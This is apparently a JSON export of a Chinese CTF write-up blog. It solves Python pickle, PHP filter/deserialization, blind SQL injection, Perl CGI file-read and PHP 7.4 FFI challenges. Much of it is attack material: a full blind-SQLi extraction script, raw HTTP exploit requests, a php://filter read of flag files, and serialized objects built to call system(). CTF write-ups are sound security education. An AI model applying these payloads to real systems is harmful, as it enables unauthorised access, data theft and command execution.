Pyshv1","text":"Balsn CTF 2019的Pyshv1和2。Python沙盒的题。 Pyshv1 先看v1。给了源码，并且已知运行环境为Python 3.6： securePickle.py12345678910111213141516import pickle, iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or &#x27;.&#x27; in name: raise KeyError(&#x27;The pickle is spoilt :(&#x27;) return pickle.Unpickler.find_class(self, module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps server.py1234567891011121314151617181920212223242526272829#!/usr/bin/python3import securePickle as pickleimport codecspickle.whitelist.append(&#x27;sys&#x27;)class Pysh(object): def __init__(self): self.login() self.cmds = &#123;&#125; def login(self): user = input().encode(&#x27;ascii&#x27;) user = codecs.decode(user, &#x27;base64&#x27;) user = pickle.loads(user) raise NotImplementedError(&quot;Not Implemented QAQ&quot;) def run(self): while True: req = input(&#x27;$ &#x27;) func = self.cmds.get(req, None) if func is None: print(&#x27;pysh: &#x27; + req + &#x27;: command not found&#x27;) else: func()if __name__ == &#x27;__main__&#x27;: pysh = Pysh() pysh.run() 这里用到了pickle，先来了解一下pickle是什么，官方文档在这里。简单来说，pickle模块是Python用于序列化与反序列化用的，源码在这里。pickle实际上是一种栈结构的语言，存在指令结构。相比PHP，它更加智能化，能够进行一些运算操作。 find_class()函数在pickle模块中实现，代码如下： 12345678910111213 def find_class(self, module, name): # Subclasses may override this.​ if self.proto &lt; 3 and self.fix_imports:​ if (module, name) in _compat_pickle.NAME_MAPPING:​ module, name = _compat_pickle.NAME_MAPPING[(module, name)]​ elif module in _compat_pickle.IMPORT_MAPPING:​ module = _compat_pickle.IMPORT_MAPPING[module]​ __import__(module, level=0)​ if self.proto &gt;= 4:​ return _getattribute(sys.modules[module], name)[0]​ else:​ return getattr(sys.modules[module], name) 注意到它会getattr()返回sys.modules的内容，sys.modules是个dict。题目所给的源码重写了find_class()函数，限制了只允许出现sys模块的内容。如果我们为sys.modules添加{'os',module('os')}，那么os模块就可以被全局使用了。 有一个基本问题是，Python中模块是什么？具体区别参考这里，就本题而言，可以单纯认为模块是一个叫做module的类的子类。所以，我们通过pickle反序列化sys，实际上是一个module类，这样是可行的。而所有的class都是object的子类。 下一问题是，我们仍然需要找到任意执行代码的手段。我们反序列化后，如果没有函数来执行就没有任何效果。PHP上我们找魔术方法，同样的Python也有，pickle在处理__reduce__方法时可能造成RCE，具体请参考这里和这里。我们同样需要__reduce__方法来触发，否则我们没有办法执行os.system()函数。 本题目前有两种做法：一是通过pickle语言直接写指令，二是构造一个module类，利用pickle类生成指令。我们选择构造一个类（pickle写不明白）。 构造class module 先来个基本框架： 123import pickle,sysclass Fake(type(sys)): pass Python中禁止直接创建module类，我们用type()间接得到。在pickle模块源码中find_class()使用到了getattr， flag{f8b94b7e-e67f-49a7-92dd-37f3ab5ad7ef}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Pickle","slug":"Pickle","permalink":"http://tiaonmmn.github.io/tags/Pickle/"}]},{"title":"BUUOJ刷题-Web-encode_and_encode","slug":"BUUOJ刷题-Web-encode-and-encode","date":"2019-10-08T08:25:29.000Z","updated":"2019-12-10T12:15:12.599Z","comments":true,"path":"2019/10/08/BUUOJ刷题-Web-encode-and-encode/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/08/BUUOJ%E5%88%B7%E9%A2%98-Web-encode-and-encode/","excerpt":"打开就送源码：","text":"打开就送源码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); is_valid()Ban了几个关键词：flag php file glob data tp zip zlib phar和..，这样我们没法用PHP流读文件了。然后它从php://input读内容，我们直接POST就可以了。我们POST的内容要是JSON，他会读page的项，如果返回内容不符合is_valid()或者没有内容就会返回not found，其他错误就返回invlaid request，然后把返回的内容中如果有HarekazeCTF{}，就把花括号中的内容删掉，最后返回结果。 正常情况下是没办法绕过is_valid()的，但是他提交的是JSON。JSON具有很强的包容性，能够接收Unicode，因此我们可以用Unicode编码字符去绕过。 根据所给的Dockerfile我们可以知道flag在根目录下。提交&#123;\"page\":\"/fl\\u0061g\"&#125;（a的Unicode编码是U+0061），返回not found，因为/flag包含flag字符串，没通过is_valid()。同样的，用php流就可以了，提交&#123;\"page\":\"ph\\u0070\\u003a//filter/convert.base64-encode/resource=/fl\\u0061g\"&#125;，返回Base64编码过的flag。反Base64就可以了。 flag{c51380a7-35c7-4a81-9e84-486421da5c27}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Unicode","slug":"Unicode","permalink":"http://tiaonmmn.github.io/tags/Unicode/"},{"name":"JSON","slug":"JSON","permalink":"http://tiaonmmn.github.io/tags/JSON/"}]},{"title":"PwnThyBytes 2019 Baby sql is not baby anymore","slug":"PwnThyBytes-2019-Baby-sql-is-not-baby-anymore","date":"2019-10-08T04:26:56.000Z","updated":"2019-12-10T12:15:12.671Z","comments":true,"path":"2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/","excerpt":"PwnThyBytes 2019的Baby sql is not baby anymore。名字够长的。猜一下是SQL注入的题。 功能很简单的，一个登陆一个注册，登陆完只有一句提示，没有其他内容。不过提示了个source.zip。 看一下源码，index.php里有个filter()函数。","text":"PwnThyBytes 2019的Baby sql is not baby anymore。名字够长的。猜一下是SQL注入的题。 功能很简单的，一个登陆一个注册，登陆完只有一句提示，没有其他内容。不过提示了个source.zip。 看一下源码，index.php里有个filter()函数。 123456function filter($value)&#123; !is_string($value) AND die(&quot;Hacking attempt!&quot;); return addslashes($value);&#125; 只用了addslashes处理了POST和GET参数，对SQL注入基本没有任何障碍。login.php那里也没有任何其他过滤。关于绕过addslashes注入可参考这个和这个。但就像参考文献所说的那样，addslashes绕过需要有一些特定条件，如MySQL使用GBK编码，或其他问题，但是这里没有，看网页编码似乎它用的UTF-8，不是GBK。因此我们需要其他的绕过方式。 我们注意到在templates下的PHP文件都有一句话：!isset($_SESSION) AND die(\"Direct access on this script is not allowed!\");，那么这句话能否绕过？ \\(\\_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，\\)_SESSION还不存在。那么，如果我们直接传入SESSION呢？ 🍊 在HITCON 2018的时候出了一道One line php，其中涉及到一个PHP SESSION的细节：如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个选项叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()（具体请参考这里）。 那么，我们传入multipart的POST包试试看。这个很简单，用requests配合files参数就可以了。 123456789import requestsurl = &quot;http://192.168.1.2:6385/templates/login.php&quot;files = &#123;&quot;file&quot;: &quot;123456789&quot;&#125;a = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;, cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;, params=&#123;&#x27;username&#x27;: &#x27;test&#x27;, &#x27;password&#x27;: &#x27;test&#x27;&#125;, proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;)print(a.text) 数据包长这样： 1234567891011121314151617181920POST /templates/login.php?username=test&amp;password=test HTTP/1.1Host: 192.168.1.2:6385User-Agent: python-requests/2.20.1Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: PHPSESSID=test1Content-Length: 266Content-Type: multipart/form-data; boundary=5c2bfb7c7c0c48ed9345b1babff33109--5c2bfb7c7c0c48ed9345b1babff33109Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;123456789--5c2bfb7c7c0c48ed9345b1babff33109Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file&quot;123456789--5c2bfb7c7c0c48ed9345b1babff33109-- 返回Try again，意味着我们成功的绕过Session检测，可以SQL注入了。这个SQL注入没有任何过滤，直接注就可以了。注意他没有回显，要盲注。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import requestsurl = &quot;http://192.168.1.2:6385/templates/login.php&quot;files = &#123;&quot;file&quot;: &quot;123456789&quot;&#125;# get database name# result = &quot;&quot;# for b in range(1, 64):# for a in range(10, 200):# param = &#123;&#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(b, a),# &#x27;password&#x27;: &#x27;test&#x27;&#125;## c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,# cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,# params=param,# #proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;# )# # print(c.text)# if &quot;again&quot; not in c.text:# result += chr(a)# print(c.text)# print(result)# get table name,we got flag_tbl and ptbctf by changing limit# result = &quot;&quot;# for b in range(1, 64):# for a in range(10, 200):# param = &#123;# &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(# b, a),# &#x27;password&#x27;: &#x27;test&#x27;&#125;## c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,# cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,# params=param,# # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;# )# # print(c.text)# if &quot;again&quot; not in c.text:# result += chr(a)# print(c.text)# print(result)# get column name of flag_tbl,we got secret# result = &quot;&quot;# for b in range(1, 64):# for a in range(10, 200):# param = &#123;# &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select column_name from information_schema.columns where table_name=&quot;flag_tbl&quot; limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format(# b, a),# &#x27;password&#x27;: &#x27;test&#x27;&#125;## c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,# cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,# params=param,# # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125;# )# # print(c.text)# if &quot;again&quot; not in c.text:# result += chr(a)# print(c.text)# print(result)# get column name of flag_tbl,we got secretresult = &quot;&quot;for b in range(1, 64): for a in range(10, 200): param = &#123; &#x27;username&#x27;: &#x27;test&quot; or if(ascii(substr((select secret from flag_tbl),&#123;0&#125;,1))=&#123;1&#125;,1,0) #&#x27;.format( b, a), &#x27;password&#x27;: &#x27;test&#x27;&#125; c = requests.post(url=url, files=files, data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;, cookies=&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;, params=param, # proxies=&#123;&#x27;http&#x27;: &quot;http://127.0.0.1:8080&quot;&#125; ) # print(c.text) if &quot;again&quot; not in c.text: result += chr(a) print(c.text) print(result) flag{03147e79-2ad9-45cf-9c25-c77289f18346}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"盲注","slug":"盲注","permalink":"http://tiaonmmn.github.io/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"},{"name":"addslashes","slug":"addslashes","permalink":"http://tiaonmmn.github.io/tags/addslashes/"},{"name":"PHP_SESSION_UPLOAD_PROGRESS","slug":"PHP-SESSION-UPLOAD-PROGRESS","permalink":"http://tiaonmmn.github.io/tags/PHP-SESSION-UPLOAD-PROGRESS/"}]},{"title":"BUUOJ刷题-Web-NiZhuanSiWei","slug":"BUUOJ刷题-Web-NiZhuanSiWei","date":"2019-10-07T07:31:48.000Z","updated":"2019-12-10T12:15:12.601Z","comments":true,"path":"2019/10/07/BUUOJ刷题-Web-NiZhuanSiWei/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/07/BUUOJ%E5%88%B7%E9%A2%98-Web-NiZhuanSiWei/","excerpt":"有点老的题了。 打开就给源码，然后扫目录发现有flag.php，访问没内容：","text":"有点老的题了。 打开就给源码，然后扫目录发现有flag.php，访问没内容： 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 第一个if要求file_get_contents读\\(text，内容为welcome to the zjctf，这个用php://input，然后POST传welcome to the zjctf就可以了。然后第二个if要求不能出现任何带有flag的字样的字符串，绕不过。然后include(\\)file)，同时提示useless.php，那么我们用PHP伪协议读useless.php，php://filter/convert.base64-encode/resource=useless.php。得到useless.php如下： 1234567891011&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; 很简单的Flag类，给\\(file赋值，会file_get_contents(\\)file)，直接打就可以了。 123456789101112131415161718&lt;?phpclass Flag&#123; //flag.php public $file=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;; public function __tostring() &#123; if (isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125;&#125;$a=new Flag();print(serialize($a)); 所以，最终的Payload为： 123456789101112131415POST /?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125; HTTP/1.1Host: 41171917-0950-4ee1-b7d0-f4ba9e0e7242.node2.buuoj.cn.wetolink.com:82Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Connection: closeContent-Length: 20welcome to the zjctf flag{02e8a6f0-ddaa-4414-a807-aa01eeae999b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"常用配置文件地址","slug":"常用配置文件地址","date":"2019-10-06T14:41:24.000Z","updated":"2019-12-10T12:15:12.677Z","comments":true,"path":"2019/10/06/常用配置文件地址/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/06/%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%9C%B0%E5%9D%80/","excerpt":"","text":"记一下常见的配置文件所在位置（默认配置）： Alpine Linux Docker的Apache2配置文件：/etc/apache2/httpd.conf（主配置文件），其余文件在/etc/apache2目录下 OpenResty环境下的Nginx配置文件：/usr/local/openresty/nginx/conf/nginx.conf Nginx的配置文件：/usr/local/nginx/conf/nginx.conf（题目出现过，但我不知道什么样的系统环境） flag{270eae65-4c94-46e0-a891-b80828933c8c}","categories":[{"name":"Logs","slug":"Logs","permalink":"http://tiaonmmn.github.io/categories/Logs/"}],"tags":[{"name":"Configuration","slug":"Configuration","permalink":"http://tiaonmmn.github.io/tags/Configuration/"}]},{"title":"CSAW2016 Web I Got ID","slug":"CSAW2016-Web-I-Got-ID","date":"2019-10-06T11:38:57.000Z","updated":"2019-12-10T12:15:12.608Z","comments":true,"path":"2019/10/06/CSAW2016-Web-I-Got-ID/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/06/CSAW2016-Web-I-Got-ID/","excerpt":"CSAW 2016 Qualification CTF的I Got ID。Perl的题。 打开页面，有三个链接，.pl结尾，可能是Perl脚本，CGI？点开以后hello.pl只有依据提示，没有作用。而forms.pl允许我们输入Name与Age。然后就原样输出了。重点是file.pl，允许我们上传文件，然后他会再读取，显示到当前页面。 然后如果我们用Acunetix，其实就能扫出来漏洞了。扫描报告如下：","text":"CSAW 2016 Qualification CTF的I Got ID。Perl的题。 打开页面，有三个链接，.pl结尾，可能是Perl脚本，CGI？点开以后hello.pl只有依据提示，没有作用。而forms.pl允许我们输入Name与Age。然后就原样输出了。重点是file.pl，允许我们上传文件，然后他会再读取，显示到当前页面。 然后如果我们用Acunetix，其实就能扫出来漏洞了。扫描报告如下： 其中有一条Directory traversal，根据所给的Payload我们可以得到/etc/passwd的内容。然后盲猜flag在根目录，我们直接读/flag就能得到flag的内容。 那么，问题来了，为什么这样就能得到flag呢？我们注意到POST的数据包中又传递了奇怪的file，内容为ARGV。具体原因我们还是翻源码吧。 根据刚才的Payload我们来尝试读一下源码，/var/www/html没有反应，我们读一下/etc/apache2/httpd.conf，这个是Alpine Linux的Apache2默认配置文件路径，从中我们得到cgi-bin在/var/www/localhost/下，然后我们读file.pl，得到下面内容： 123456789101112131415161718192021222324252627282930 #!/usr/bin/perluse strict;use warnings; use CGI;my $cgi = CGI-&gt;new;print $cgi-&gt;header;print &lt;&lt; &quot;EndOfHTML&quot;;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; lang=&quot;en-US&quot; xml:lang=&quot;en-US&quot;&gt; &lt;head&gt; &lt;title&gt;Perl File Upload&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Perl File Upload&lt;/h1&gt; &lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; File:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Submit!&quot; value=&quot;Submit!&quot; /&gt; &lt;/form&gt; &lt;hr /&gt;EndOfHTMLif ($cgi-&gt;upload(&#x27;file&#x27;)) &#123; my $file = $cgi-&gt;param(&#x27;file&#x27;); while (&lt;$file&gt;) &#123; print &quot;$_&quot;; print &quot;&quot;; &#125;&#125;print &#x27;&lt;/body&gt;&lt;/html&gt;&#x27;; 首先看一下第23行，my $file= $cgi-&gt;param( 'file' )，这里有个问题，Perl的CGI模块有param()方法，用来接收我们传递的参数（POST/GET均可），参考这个，重点是如果我们传入的参数是重复的，例如传入/?a=1&amp;a=2，那么param('a')默认情况下会只返回传入的第一个参数，上例中param('a')返回1（除非用scalar限定返回的是数组，或者用multi_param()方法）。因此，我们在上传文件的时候在正常的文件数据前插入一个name=\"file\"的部分，实际上\\(file就会变成我们插入的内容。\\)file可控。 下一个重点是第24行：while (&lt;$file&gt;) &#123;，Perl中&lt;&gt;代表输入输出句柄，具体参考这里的I/O Operators一节与这里，简单来说，&lt;abc&gt;，代表打开了一个叫做abc的文件，它相当于readline(open(abc))，readline的说明请参考这里。&lt;&gt;中的内容是一个文件句柄，我们直接传入字符串是没有用的，但有几个预置变量除外：STDIN、STDOUT、STDERR与ARGV，我们传入ARGV就会让while循环处理ARGV数组，而ARGV是什么？参考这个、这个与这个，简单来说就是Perl脚本运行的时候传入的参数，在CGI下还包含传递的GET参数。因此我们如果访问file.pl?/etc/passwd，ARGV就会变成['/etc/passwd']，从而打开/etc/passwd并显示内容。 所以，我们提交file.pl?/flag就可以得到flag了。 还有没有别的方法呢？我们刚才得到flag是基于我们猜到了flag位于根目录，如果不是呢？我们能否通过Perl进行RCE？ 答案是可以的，Perl在处理&lt;&gt;的时候会默认调用open()方法，而open()方法可以执行命令，具体参考这个，我们在传入文件名的时候后面加一个|就可以了。Payload如下： 注意在|前面要有空格。 关于Perl CGI的其他缺点可参考下面的Gist。 flag{41ff23eb-30f9-4fec-aca2-f53a739f0fe2}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Perl","slug":"Perl","permalink":"http://tiaonmmn.github.io/tags/Perl/"},{"name":"CGI","slug":"CGI","permalink":"http://tiaonmmn.github.io/tags/CGI/"},{"name":"Acunetix","slug":"Acunetix","permalink":"http://tiaonmmn.github.io/tags/Acunetix/"}]},{"title":"BUUOJ刷题-Web-nextphp","slug":"BUUOJ刷题-Web-nextphp","date":"2019-10-04T11:06:04.000Z","updated":"2019-12-10T12:15:12.600Z","comments":true,"path":"2019/10/04/BUUOJ刷题-Web-nextphp/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/04/BUUOJ%E5%88%B7%E9%A2%98-Web-nextphp/","excerpt":"RCTF 2019的nextphp。 开局一个eval，剩下全靠编。","text":"RCTF 2019的nextphp。 开局一个eval，剩下全靠编。 123456&lt;?phpif (isset($_GET[&#x27;a&#x27;])) &#123; eval($_GET[&#x27;a&#x27;]);&#125; else &#123; show_source(__FILE__);&#125; 想当然地先试一下system，不出所料的被disable了，那么看一下phpinfo吧。PHP 7.4.0-dev，特别新的版本。额外加载了/usr/local/etc/php/conf.d/php-nextphp.ini，ReflectionClass被Ban，一大堆函数也被Ban了：set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl。可以看到，执行命令的函数全Ban，mail也Ban了，设置了open_basedir为/var/www/html。 目前我们可以读文件内容与列目录。/?a=print_r(scandir(\".\"));，发现有preload.php，我们读一下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfinal class A implements Serializable &#123; protected $data = [ &#x27;ret&#x27; =&gt; null, &#x27;func&#x27; =&gt; &#x27;print_r&#x27;, &#x27;arg&#x27; =&gt; &#x27;1&#x27; ]; private function run () &#123; $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125; public function __construct () &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125;&#125; 我们可以在index.php中unserialize一个类，但是我们目前并不知道preload.php的类与index.php有什么联系。 这时就要问一个问题，为什么要用PHP 7.4？我们查一下PHP 7.4的新特性，发现有几个很有趣：Preloading和New Custom Object Serialization Mechanism。Preload机制简单来说就是在PHP7.4中，允许我们在Web服务运行周期内提前预加载某些PHP文件，加载的文件将在所有PHP文件中可用。而自定义的序列化机制就有点意思了，我们可以在类中重写新的魔法函数：__serialize和__unserialize，unserialize的时候会调用run()，run()调用\\(data[&#39;func&#39;]所指函数，返回值写到\\)data['ret']里，而且提供了__get方法允许我们得到返回值。 我们试一下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpfinal class A implements Serializable &#123; protected $data = [ &#x27;ret&#x27; =&gt; null, &#x27;func&#x27; =&gt; &#x27;print_r&#x27;, &#x27;arg&#x27; =&gt; array( &quot;123&quot;=&gt;&quot;abc&quot;, &quot;456&quot;=&gt;&quot;def&quot; ) ]; private function run () &#123; $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#x27;No implemented&#x27;); &#125;&#125;$a=new A();print(base64_encode(serialize($a)).&quot;\\n&quot;);print(serialize($a));?&gt; 然后访问/?a=unserialize(base64_decode(%22QzoxOiJBIjo5MTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6NzoicHJpbnRfciI7czozOiJhcmciO2E6Mjp7aToxMjM7czozOiJhYmMiO2k6NDU2O3M6MzoiZGVmIjt9fX0=%22))-%3E__get(%27ret%27);发现我们确实能够print_r一个数组。这证实了preload.php确实被预加载了，然后呢？反序列化对于本题目前没有任何作用。 我们再翻PHP的What's New，发现还有一条：FFI(Foreign Function Interface)，允许我们在PHP中使用C的函数。具体参考这里，那么我们就可以使用FFI类执行system()，从而得到flag。可是我们在index.php中使用FFI类不能产生效果，后来发现PHP对于ffi有一定的限制，当ffi.enable=preload时，FFI仅能在CLI和preload的文件中使用。那么我们使用反序列化的点就好了。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpfinal class A implements Serializable &#123; protected $data = [ &#x27;ret&#x27; =&gt; null, &#x27;func&#x27; =&gt; &#x27;FFI::cdef&#x27;, &#x27;arg&#x27; =&gt; &quot;int system(const char *command);&quot; ]; private function run () &#123; $this-&gt;data[&#x27;ret&#x27;] = $this-&gt;data[&#x27;func&#x27;]($this-&gt;data[&#x27;arg&#x27;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#x27;No implemented&#x27;); 